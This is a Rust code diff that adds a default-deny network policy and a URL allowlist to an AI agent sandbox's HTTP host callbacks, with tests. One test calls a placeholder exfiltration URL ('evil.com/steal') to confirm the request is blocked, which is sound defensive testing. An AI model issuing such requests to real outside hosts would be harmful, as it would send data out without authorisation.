@@ -5,6 +5,7 @@
 //! same policy and audit pipeline as built-in tools (ADR 0003).
 
 use agentzero_sandbox::wasm::WasmHostCallbacks;
+use agentzero_sandbox::SandboxNetworkPolicy;
 use agentzero_tracing::{info, warn};
 
 use crate::tool_exec::ToolExecutor;
@@ -15,12 +16,24 @@ use crate::tool_exec::ToolExecutor;
 /// which validates paths, checks policy, and emits audit events.
 pub struct SessionHostCallbacks {
     executor: ToolExecutor,
+    network_policy: SandboxNetworkPolicy,
 }
 
 impl SessionHostCallbacks {
     /// Create callbacks backed by the given tool executor.
+    ///
+    /// Network policy defaults to `Deny` — no outbound HTTP requests.
     pub fn new(executor: ToolExecutor) -> Self {
-        Self { executor }
+        Self {
+            executor,
+            network_policy: SandboxNetworkPolicy::Deny,
+        }
+    }
+
+    /// Create callbacks with a specific network policy.
+    pub fn with_network_policy(mut self, policy: SandboxNetworkPolicy) -> Self {
+        self.network_policy = policy;
+        self
     }
 }
 
@@ -156,6 +169,18 @@ impl WasmHostCallbacks for SessionHostCallbacks {
                 "http_request denied by policy"
             );
             return Err(format!("http_request denied: {decision:?}"));
+        }
+
+        // 1b. URL allowlist check (SandboxNetworkPolicy)
+        if !self.network_policy.allows_url(url) {
+            warn!(
+                host_call = "http_request",
+                url = url,
+                "http_request URL not allowed by network policy"
+            );
+            return Err(format!(
+                "http_request denied: URL '{url}' not allowed by network policy"
+            ));
         }
 
         // 2. PII scan on request body — block if secrets detected
@@ -410,11 +435,13 @@ mod tests {
 
     #[test]
     fn http_request_blocks_body_with_secrets() {
+        use agentzero_sandbox::SandboxNetworkPolicy;
         let policy = PolicyEngine::with_rules(vec![PolicyRule::allow(
             Capability::NetworkRequest,
             DataClassification::Private,
         )]);
-        let cb = SessionHostCallbacks::new(ToolExecutor::new(policy));
+        let cb = SessionHostCallbacks::new(ToolExecutor::new(policy))
+            .with_network_policy(SandboxNetworkPolicy::AllowEgress);
         let result = cb.http_request(
             "https://example.com",
             "POST",
@@ -426,6 +453,45 @@ mod tests {
         assert!(
             err.contains("secrets") || err.contains("PII"),
             "error should mention secrets: {err}"
+        );
+    }
+
+    #[test]
+    fn http_request_url_denied_by_network_policy() {
+        use agentzero_sandbox::SandboxNetworkPolicy;
+        let policy = PolicyEngine::with_rules(vec![PolicyRule::allow(
+            Capability::NetworkRequest,
+            DataClassification::Private,
+        )]);
+        // NetworkRequest capability is allowed, but URL is filtered
+        let cb = SessionHostCallbacks::new(ToolExecutor::new(policy)).with_network_policy(
+            SandboxNetworkPolicy::AllowEgressFiltered {
+                allowed_hosts: vec!["api.slack.com".to_string()],
+            },
+        );
+        let result = cb.http_request("https://evil.com/steal", "GET", "{}", "");
+        assert!(result.is_err());
+        let err = result.expect_err("should deny URL");
+        assert!(
+            err.contains("not allowed"),
+            "error should mention not allowed: {err}"
+        );
+    }
+
+    #[test]
+    fn http_request_default_network_policy_is_deny() {
+        // Even with NetworkRequest capability, default Deny policy blocks all URLs
+        let policy = PolicyEngine::with_rules(vec![PolicyRule::allow(
+            Capability::NetworkRequest,
+            DataClassification::Private,
+        )]);
+        let cb = SessionHostCallbacks::new(ToolExecutor::new(policy));
+        let result = cb.http_request("https://example.com", "GET", "{}", "");
+        assert!(result.is_err());
+        let err = result.expect_err("should deny");
+        assert!(
+            err.contains("not allowed"),
+            "error should mention not allowed: {err}"
         );
     }
 
